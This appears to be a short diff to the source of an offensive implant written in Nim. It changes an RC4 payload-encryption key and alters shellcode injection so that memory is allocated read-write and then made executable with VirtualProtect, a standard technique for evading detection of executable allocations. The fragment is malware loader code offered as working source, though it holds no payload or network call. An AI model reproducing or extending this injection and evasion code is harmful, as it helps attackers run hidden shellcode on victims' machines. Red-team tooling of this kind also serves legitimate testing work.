@@ -22,7 +22,7 @@ const sleepTime = 30 * 1000
 const encMethod = 2
 # Encoding / encryption keys
 const xorKey = 0x52
-const rc4Key = [char '5', 'b', '(', 'a', '@', '3', '7', 'k', '~', 'z', 'L', '9', '*', 'K', '#', '-']
+const rc4Key = [char 'G', 'h', 'o', 's', 't', 'N', 'a', 'p', ' ', 'R', 'o', 'c', 'k', 's', '!', '!']
 
 ##############################
 ########### Config ###########
@@ -56,10 +56,19 @@ proc injectShellcode(shellc: seq[byte], execMethod: int): bool =
         NULL,
         shellcSize,
         MEM_COMMIT,
-        PAGE_EXECUTE_READWRITE
+        PAGE_READWRITE
     )
 
     when not defined(release): echo "[i] Allocated memory for shellcode at 0x" & repr shellcAddress
+
+    # Change protection to executable
+    var oldProtection : DWORD
+    VirtualProtect(
+        shellcAddress,
+        shellcSize,
+        PAGE_EXECUTE_READWRITE,
+        addr oldProtection
+    )
 
     # Append to implantAllocs to add protection
     implantAllocs.add((shellcAddress, shellcSize))
